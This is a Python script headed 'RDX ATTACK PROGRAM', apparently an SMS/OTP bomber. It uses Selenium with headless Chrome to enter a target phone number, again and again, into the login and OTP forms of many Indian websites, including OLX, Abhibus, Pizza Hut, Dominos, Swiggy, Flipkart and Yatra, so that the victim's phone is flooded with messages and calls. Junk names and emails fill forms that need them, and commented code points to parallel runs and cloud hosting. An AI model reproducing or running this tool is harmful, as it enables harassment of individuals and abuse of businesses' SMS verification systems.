# --------------------------------------------------------  RDX ATTACK PROGRAM -----------------------------------
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import  random
import os
import multiprocessing

# -------------------------     USING ARGUMENTS     ----------------------
import argparse
my_parser = argparse.ArgumentParser(description='give the mobile number and the sms number')
my_parser.add_argument('mn', metavar='mn',type=str, help='Mobile Number')
my_parser.add_argument('fq', metavar='fq',type=str, help='Numbers Of Sms')
args = my_parser.parse_args()

mn = args.mn
fq = args.fq

# --------------------         MAIN PROGRAM           -------------------------

# os.system("heroku run:detached python changeworker.py add rdxbomb -app rdxbomb")

options = Options()

options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")

options.add_argument('--headless')

options.add_argument('--disable-dev-shm-usage')

options.add_argument('--no-sandbox')

# -------------------------------------------------------
# options.add_argument('--disable-gpu')


browser = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"),options=options)
# browser = webdriver.Chrome()


def call_olx(num):
    try:
        browser.get('https://www.olx.in/')
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="container"]/header/div/div/div[4]/button/span').click()
        time.sleep(3)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/div/button[1]/span').click()
        time.sleep(3)

        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/form/div/button').click()
        time.sleep(2)

        browser.find_element_by_xpath('/html/body/div[3]/div/div/form/div/div[4]/span/span').click()
        print(" olx send ")

        time.sleep(2)



    except:
        print("olx failed")


def call_abhibus(num):
    try:
        browser.get('https://www.abhibus.com/')
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="AccLogin"]').click()
        time.sleep(3)


        browser.find_element_by_xpath('//*[@id="mobileNo"]').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="getotp"]').click()

        time.sleep(30)

        browser.find_element_by_xpath('//*[@id="btngetoncall1"]').click()
        print(" abhibus send ")

        time.sleep(2)



    except:
        print("abhibus failed")

# -------------------------------------------------END FUNCTIONS ----------------------------------------------


funclist = [call_olx,call_abhibus]


for i in range(int(fq)+1):
    sf = random.choice(funclist)
    sf(mn)



# if __name__ == "__main__":
#     t1 = multiprocessing.Process(target=bomb)
#     t2 = multiprocessing.Process(target=bomb)
#     # t3 = multiprocessing.Process(target=bomb)
#     # t4 = multiprocessing.Process(target=bomb)
#     # t5 = multiprocessing.Process(target=bomb)
#     # t6 = multiprocessing.Process(target=bomb)
#     # t7 = multiprocessing.Process(target=bomb)
#     # t8 = multiprocessing.Process(target=bomb)

#     t1.start()
#     t2.start()
#     # t3.start()
#     # t4.start()
#     # t5.start()
#     # t6.start()
#     # t7.start()
#     # t8.start()

#     t1.join()
#     t2.join()


def myupchar(num):
    try:
        browser.get('https://www.myupchar.com/users/sign_up')
        time.sleep(4)
        number = browser.find_element_by_id('Phone-number').send_keys(num)
        time.sleep(2)
        browser.find_element_by_id("send-otp").click()
        time.sleep(2)
        print("myupchar send")
    except:
        print("myupchar failed")


def pizzahut(num):
    try:
        browser.get('https://www.pizzahut.co.in/account/otp')
        time.sleep(4)
        number = browser.find_element_by_id('phone-field').send_keys(num)
        time.sleep(2)
        browser.find_element_by_xpath("//*[@id='app']/div/div[2]/div/form/button").click()
        time.sleep(2)
        print("pizzahut send")
    except:
        print("pizzahut failed")

def unacademy(num):
    try:
        browser.get('https://unacademy.com/')
        time.sleep(4)
        browser.find_element_by_xpath("//*[@id='__next']/header/div/button").click()
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="DrawerPaper"]/div[2]/div[1]/div[2]/div/input').send_keys(num)
        time.sleep(2)
        browser.find_element_by_xpath('//*[@id="DrawerPaper"]/div[2]/div[1]/div[3]/button').click()
        time.sleep(2)
        print("unacademy send")
    except:
        print("unacademy failed")


def dominos(num):
    try:
        browser.get('https://pizzaonline.dominos.co.in/')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[1]/div[2]').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[1]/div[2]/input').send_keys(num)
        browser.find_element_by_xpath('//*[@id="__next"]/div/div[1]/div[1]/div/div[3]/div[2]/div[2]/div/div[3]/div/div/div/div[2]/div/form/div[2]/input').click()
        time.sleep(2)
        print("dominos send")
    except:
        print("dominos failed")



def medlife(num):
    try:
        browser.get('https://www.medlife.com/Login')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[1]/div/button[2]').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[2]/div[1]/input').send_keys(num)
        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/div[1]/div[1]/div/div[1]/form/div[3]/button').click()
        time.sleep(2)
        print("medlife ok")
    except:
        print("medlife failed")



def lybrate(num):
    try:
        browser.get('https://www.lybrate.com/login?lpt=HOME')
        time.sleep(4)
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/ul/li[2]/a').click()
        time.sleep(3)
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[1]/input').send_keys("dfhvbfhhkdv")
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[2]/div[2]/span/input').send_keys(num)
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[3]/input').send_keys("8fvuvh@frfrhf")
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/div/div[4]/input').send_keys("fbvfhvhfvbfhvfvbhfvbfhvb@gmail.com")
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/md-card/div/div/form/div/section/button').click()
        time.sleep(2)
        print("lybrate ok")
    except:
        print("lybrate failed")




def netmeds(num):
    try:
        browser.get('https://www.netmeds.com/customer/account/login')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="loginfirst_mobileno"]').send_keys(num)
        browser.find_element_by_xpath('//*[@id="app"]/main/app-login/div[1]/div/div[1]/div[2]/div/div[1]/form/div[2]/button[2]').click()
        time.sleep(2)
        print("netmeds ok")
    except:
        print("netmeds failed")



def swigy(num):
    try:
        browser.get('https://www.swiggy.com/')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="root"]/div[1]/div[1]/div/div[1]/div[1]/div/div[1]/div/a[2]').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(num)
        browser.find_element_by_xpath('//*[@id="name"]').send_keys("hudfhvudhdfhdfvhfuvhfvhdfv")
        browser.find_element_by_xpath('//*[@id="password"]').send_keys("8fvuvh@frfrhf")
        browser.find_element_by_xpath('//*[@id="email"]').send_keys("fbvfhvhfvbfhvfvbhfvbfhvb@gmail.com")

        browser.find_element_by_xpath('//*[@id="overlay-sidebar-root"]/div/div/div[2]/div/div/div/div[2]/form/div[3]/a').click()
        time.sleep(2)
        print("swigy ok")
    except:
        print("swigy failed")

def housing(num):
    try:
        browser.get('https://housing.com/')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="app"]/div[1]/header/div/div').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="app"]/div[1]/div[2]/div[2]/div[2]/div[2]/form/div/div/input').send_keys(num)
        browser.find_element_by_xpath('//*[@id="app"]/div[1]/div[2]/div[2]/div[2]/div[2]/form/button').click()
        time.sleep(2)

        print("housing ok")
    except:
        print("housing failed")

def dunzo(num):
    try:
        browser.get('https://www.dunzo.com/')
        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="header"]/div/div/div/div[3]/div/p').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="modal"]/div/div[2]/div/div/div/div/div/div/input').send_keys(num)
        browser.find_element_by_xpath('//*[@id="modal"]/div/div[2]/div/div/div/div/div/div/div[2]/button').click()
        time.sleep(2)

        print("dunzo ok")
    except:
        print("dunzo failed")

def justdial(num):
    try:
        browser.get('https://www.justdial.com/')

        time.sleep(4)
        browser.find_element_by_xpath('//*[@id="h_login"]').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="lgn_name"]').send_keys("ghgdjfdff")
        time.sleep(2)
        browser.find_element_by_xpath('//*[@id="lgn_mob"]').send_keys(num)
        time.sleep(2)
        browser.find_element_by_xpath('//*[@id="lgn_smtn"]').click()
        time.sleep(2)

        print("justdial ok")
    except:
        print("justdial failed")

def housejoy(num):
    try:
        browser.get('https://www.housejoy.in/')
        time.sleep(4)
        try:
            browser.find_element_by_xpath('//*[@id="locationPopModal"]/div/div[3]/img').click()
        except:
            pass
        time.sleep(2)
        browser.find_element_by_xpath('//*[@id="top-head-height"]/div/nav/div[1]/div/div[3]/ul/li[3]/div').click()
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="loginModal"]/div/div/div[2]/div/div[1]/div/div/input').send_keys(num)
        time.sleep(3)
        browser.find_element_by_xpath('//*[@id="loginModal"]/div/div/div[2]/div/div[2]/div[1]/div').click()
        time.sleep(2)

        print("homejoy ok")
    except:
        print("homejoy failed")

def filpkart(num):
    try:
        browser.get('https://www.flipkart.com/')

        time.sleep(4)
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div/div[2]/div/form/div[1]/input').send_keys(num)
        time.sleep(3)
        browser.find_element_by_xpath('/html/body/div[2]/div/div/div/div/div[2]/div/form/div[4]/button').click()
        time.sleep(2)
        print("filipkart ok")
    except:
        print("filipkart send")




def yatra(num):
    try:
        browser.get('https://secure.yatra.com/social/common/yatra/register')
        time.sleep(4)


        browser.find_element_by_xpath('//*[@id="login-input"]').send_keys(num)
        time.sleep(3)

        browser.find_element_by_xpath('//*[@id="login-continue-btn"]').click()
        print("yatra send")



    except:
        print("yatra failed")



def gradeup(num):
    try:
        browser.get('https://gradeup.co/')
        time.sleep(2)


        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/section[1]/div/div[2]/div/div/form/label/input').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="__next"]/div[2]/section[1]/div/div[2]/div/div/form/button').click()


        print(" gradeup send ")



    except:
        print("gradeup failed")

def vedantu(num):
    try:
        browser.get('https://www.vedantu.com/')
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="login-link"]').click()
        time.sleep(2)



        browser.find_element_by_xpath('//*[@id="login-email-phone"]/input').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('//*[@id="login-submit3"]').click()


        print(" vedantu send ")



    except:
        print("vedantu failed")


def goindigo(num):
    try:
        browser.get('https://www.goindigo.in/member/registration.html')
        time.sleep(2)



        browser.find_element_by_xpath('/html/body/div[4]/div[1]/div/section/div[1]/div/div/form/div/div[1]/div[2]/div/input').send_keys(num)
        time.sleep(2)

        browser.find_element_by_xpath('/html/body/div[4]/div[1]/div/section/div[1]/div/div/form/div/button').click()


        print(" goindigo send ")



    except:
        print("goindigo failed")






# ---------------------------------------------------------------END  SCRIPT -----------------------------------------------------------
